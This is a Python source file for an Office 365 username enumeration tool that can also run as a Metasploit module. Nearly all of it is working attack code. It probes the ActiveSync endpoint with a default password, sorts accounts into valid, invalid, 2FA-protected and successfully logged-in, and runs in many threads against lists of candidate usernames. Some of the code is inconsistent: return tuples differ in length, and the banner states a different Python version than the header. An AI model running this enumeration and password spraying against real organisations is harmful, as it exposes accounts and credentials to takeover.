#! /usr/bin/env python
# -*- coding: utf-8 -*-


'''
.       .1111...          | Title: office365userenum.py
    .10000000000011.   .. | Author: Oliver Morton (Sec-1 Ltd)
 .00              000...  | Email: oliverm@sec-1.com
1                  01..   | Description:
                    ..    | Enumerate valid usernames from Office 365 using
                   ..     | ActiveSync.
GrimHacker        ..      | Requires: Python 3.6, python-requests
                 ..       |
grimhacker.com  ..        |
@grimhacker    ..         |
----------------------------------------------------------------------------
office365userenum - Office 365 Username Enumerator
    Copyright (C) 2015  Oliver Morton (Sec-1 Ltd)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
'''

__version__ = "$Revision: 3.0$"
# $Source$

import argparse
import threading
import logging
import sys

import queue

dependencies_missing = False
try:
    import requests
except ImportError as e:
    print("Missing Dependency! python-requests required!")
    dependencies_missing = True


VALID_USER = "VALID_USER"
INVALID_USER = "INVALID_USER"
VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
VALID_LOGIN = "VALID_LOGIN"
UNKNOWN = "UNKNOWN"
DIE = "!!!AVADA KEDAVRA!!!"
SHUTDOWN_EVENT = threading.Event()

default_password = "Password1"
default_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
default_max_threads = 10
default_timeout = 30

MSF = False
try:
    from metasploit import module
    MSF = True

    metadata = {
        'name': 'Office 365 User Enumeration',
        'description': '''
            Enumerate valid usernames (email addresses) from Office 365 using ActiveSync.
            Differences in the HTTP Response code and HTTP Headers can be used to differentiate between:
             - Valid Username (Response code 401)
             - Valid Username and Password without 2FA (Response Code 200)
             - Valid Username and Password with 2FA (Response Code 403)
             - Invalid Username (Response code 404 with Header X-CasErrorCode: UserNotFound)
            Note this behaviour appears to be limited to Office365, MS Exchange does not appear to be affected.
            Microsoft Security Response Center stated on 2017-06-28 that this issue does not "meet the bar for security
            servicing". As such it is not expected to be fixed any time soon. 
        ''',
        'authors': [
            'Oliver Morton (GrimHacker) <grimhacker@grimhacker.com>'
        ],
        'date': '2018-09-05',
        'license': 'GPL_LICENSE',
        'references': [
            {'type': 'url', 'ref': 'https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/'},
        ],
        'type': 'single_scanner',
        'options': {
            'USERS': {
                'type': 'string',
                'description': 'Potential usernames file, one username per line',
                'required': True,
                'default': None
            },
            'OUTPUT': {
                'type': 'string',
                'description': 'Output file (will be appended to)',
                'required': False,
                'default': None
            },
            'PASSWORD': {
                'type': 'string',
                'description': 'Password to use during enumeration.',
                'required': True,
                'default': default_password
            },
            # TODO: MSF is adding RHOSTS automatically as a required option,
            #  if i rename URL to RHOSTS or RHOST the module breaks...
            'URL': {
                'type': 'string',
                'description': 'ActiveSync URL',
                'required': True,
                'default': default_url
            },
            'THREADS': {
                'type': 'int',
                'description': 'Maximum threads',
                'required': True,
                'default': default_max_threads
            },
            'TIMEOUT': {
                'type': 'int',
                'description': 'HTTP Timeout',
                'required': True,
                'default': default_timeout
            },
            'VERBOSE': {
                'type': 'bool',
                'description': 'Debug logging',
                'required': True,
                'default': False
            },
            'LOGFILE': {
                'type': 'string',
                'description': 'Log file',
                'required': False,
                'default': None
            },
            # TODO: RPORT needs to exist or reporting the valid/invalid creds causes an error...
            'RPORT': {
                'type': 'int',
                'description': 'IGNORE ME!',
                'required': False,
                'default': 443
            }
        }
    }

except ImportError as e:
    # Not running under metasploit
    pass


def check_user(url, user, password, timeout):
    """Exploit the difference in HTTP responses from the ActiveSync service to identify valid and invalid usernames.
    It was also identified that valid accounts with 2FA enabled can be distinguished from valid accounts without 2FA."""
    headers = {"MS-ASProtocolVersion": "14.0"}
    auth = (user, password)
    try:
        r = requests.options(url, headers=headers, auth=auth, timeout=timeout)
    except Exception as e:
        msg = "error checking {} : {}".format(user, e)
        if MSF:
            module.log(msg, "error")
        else:
            logging.error(msg)
        return user, UNKNOWN, None
    status = r.status_code
    if status == 401:
        return user, password, VALID_USER, r
    elif status == 404:
        if r.headers.get("X-CasErrorCode") == "UserNotFound":
            return user, password, INVALID_USER, r
    elif status == 403:
        return user, VALID_PASSWD_2FA, r
    elif status == 200:
        return user, password, VALID_LOGIN, r
    return user, password, UNKNOWN, r


def check_users(in_q, out_q, url, password, timeout):
    """Thread worker function which retrieves candidate username from input queue runs the check_user function and
    outputs the result to the output queue."""
    while not SHUTDOWN_EVENT.is_set():
        try:
            user = in_q.get()
        except queue.Empty as e:
            msg = "check_users: in_q empty"
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            continue
        if user == DIE:
            in_q.task_done()
            msg = "check_users thread dying"
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            break
        else:
            msg = "checking: {}".format(user)
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            try:
                result = check_user(url, user, password, timeout)
            except Exception as e:
                msg = "Error checking {} : {}".format(user, e)
                if MSF:
                    module.log(msg, "error")
                else:
                    logging.error(msg)
                in_q.task_done()
                continue
            msg = "{}".format(result)
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            out_q.put(result)
            in_q.task_done()


def get_users(user_file, in_q, max_threads):
    """Thread worker function. Load candidate usernames from file into input queue."""
    with open(user_file, "r") as f:
        for line in f:
            if SHUTDOWN_EVENT.is_set():
                break
            user = line.strip()
            msg = "user = {}".format(user)
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            in_q.put(user)
    for _ in range(max_threads):
        in_q.put(DIE)


def report(out_q, output_file):
    """Thread worker function. Output to terminal and file."""
    msf_template = "{code} {valid} {user}:{password}"
    template = "[{s}] {code} {valid} {user}:{password}"
    symbols = {
        VALID_USER: "+",
        INVALID_USER: "-",
        VALID_PASSWD_2FA: "#",
        VALID_LOGIN: "!",
        UNKNOWN: "?"
    }

    while not SHUTDOWN_EVENT.is_set():
        try:
            result = out_q.get()
        except queue.Empty as e:
            msg = "report: out_q empty"
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            continue
        if result == DIE:
            out_q.task_done()
            msg = "report thread dying."
            if MSF:
                module.log(msg, "debug")
            else:
                logging.debug(msg)
            break
        else:
            user, password, valid, r = result
            if r is None:
                code = "???"
            else:
                code = r.status_code
            s = symbols.get(valid)
            output = template.format(s=s, code=code, valid=valid, user=user, password=password)
            if MSF:
                msf_output = msf_template.format(code=code, valid=valid, user=user, password=password)
                msf_reporters = {
                    VALID_USER: module.report_wrong_password,
                    VALID_PASSWD_2FA: module.report_correct_password,
                    VALID_LOGIN: module.report_correct_password
                }
                module.log(msf_output, "debug")
                msf_reporter = msf_reporters.get(valid)
                if msf_reporter is not None:
                    msf_reporter(user, password)
                if valid in [VALID_LOGIN, VALID_PASSWD_2FA, VALID_USER]:
                    module.log(msf_output, "good")
                else:
                    module.log(msf_output, "error")
            else:
                logging.info(output)
            if output_file:
                with open(output_file, "a", 1) as f:
                    f.write("{}\n".format(output))
            out_q.task_done()


def run(args):
    """Metasploit callback.
    Convert args to lowercase for internal compatibility."""
    if dependencies_missing:
        module.log("Module dependency (requests) is missing, cannot continue")
        return
    args['TIMEOUT'] = float(args['TIMEOUT'])
    args['THREADS'] = int(args['THREADS'])
    lower_args = {}
    for arg in args:
        lower_args[arg.lower()] = args[arg]
    main(lower_args)


def get_banner():
    """Return version banner."""
    return """

.       .1111...          | Title: office365userenum.py
    .10000000000011.   .. | Author: Oliver Morton (Sec-1 Ltd)
 .00              000...  | Email: oliverm@sec-1.com
1                  01..   | Description:
                    ..    | Enumerate valid usernames from Office 365 using
                   ..     | ActiveSync.
GrimHacker        ..      | Requires: Python 2.7 or 3.6, python-requests
                 ..       |
grimhacker.com  ..        |
@grimhacker    ..         |
----------------------------------------------------------------------------
    This program comes with ABSOLUTELY NO WARRANTY.
    This is free software, and you are welcome to redistribute it
    under certain conditions. See GPLv2 License.
----------------------------------------------------------------------------
""".format(__version__)


def setup_logging(verbose=True, log_file=None):
    """Configure logging."""
    if log_file is not None:
        logging.basicConfig(level=logging.DEBUG,
                            format="%(asctime)s: %(levelname)s: %(module)s: %(message)s",
                            filename=log_file,
                            filemode='w')
        console_handler = logging.StreamHandler()
        formatter = logging.Formatter("%(levelname)s: %(module)s: %(message)s")
        console_handler.setFormatter(formatter)
        if verbose:
            console_handler.setLevel(logging.DEBUG)
        else:
            console_handler.setLevel(logging.INFO)
        logging.getLogger().addHandler(console_handler)
    else:
        if verbose:
            level = logging.DEBUG
        else:
            level = logging.INFO
        logging.basicConfig(level=level,
                            format="%(levelname)s: %(module)s: %(message)s")


def main(args):
    """Setup worker threads and handle shutdown."""
    user_file = args['users']
    output_file = args['output']
    url = args['url']
    password = args['password']
    max_threads = args['threads']
    timeout = args['timeout']

    threads = []
    meta_threads = []
    max_size = max_threads / 2
    if max_size < 1:
        max_size = 1
    in_q = queue.Queue(maxsize=max_size)
    out_q = queue.Queue(maxsize=max_size)

    try:
        report_thread = threading.Thread(name="Thread-report", target=report, args=(out_q, output_file))
        report_thread.start()
        meta_threads.append(report_thread)

        file_thread = threading.Thread(name="Thread-inputfile", target=get_users, args=(user_file, in_q, max_threads))
        file_thread.start()
        meta_threads.append(file_thread)

        for num in range(max_threads):
            t = threading.Thread(name="Thread-worker{}".format(num), target=check_users,
                                 args=(in_q, out_q, url, password, timeout))
            t.start()
            threads.append(t)

        for thread in threads:
            while thread.is_alive():
                thread.join(timeout=0.1)
        out_q.put(DIE)
        for thread in meta_threads:
            while thread.is_alive():
                thread.join(timeout=0.1)

    except KeyboardInterrupt as e:
        msg = "Received KeyboardInterrupt - shutting down"
        if MSF:
            module.log(msg, "critical")
        else:
            logging.critical(msg)
        SHUTDOWN_EVENT.set()

        for thread in threads:
            while thread.is_alive():
                thread.join(timeout=0.1)
        out_q.put(DIE)
        for thread in meta_threads:
            while thread.is_alive():
                thread.join(timeout=0.1)


if __name__ == "__main__":
    if MSF:
        module.log(get_banner(), "info")
        module.run(metadata, run)
    else:
        print(get_banner())
        parser = argparse.ArgumentParser(description="Enumerate Usernames (email addresses) from Office365 ActiveSync")
        parser.add_argument("-u", "--users", help="Potential usernames file, one username per line", required=True)
        parser.add_argument("-o", "--output", help="Output file (will be appended to)", required=True)
        parser.add_argument("--password", default=default_password,
                            help="Password to use during enumeration. Default: {}".format(default_password))
        parser.add_argument("--url", help="ActiveSync URL. Default: {}".format(default_url), default=default_url)
        parser.add_argument("--threads", help="Maximum threads. Default: {}".format(default_max_threads),
                            default=default_max_threads, type=int)
        parser.add_argument("--timeout", help="HTTP Timeout. Default: {}".format(default_timeout),
                            default=default_timeout, type=float)
        parser.add_argument("-v", "--verbose", help="Debug logging", action="store_true")
        parser.add_argument("--logfile", help="Log File", default=None)

        args = parser.parse_args()

        setup_logging(args.verbose, args.logfile)

        main(vars(args))
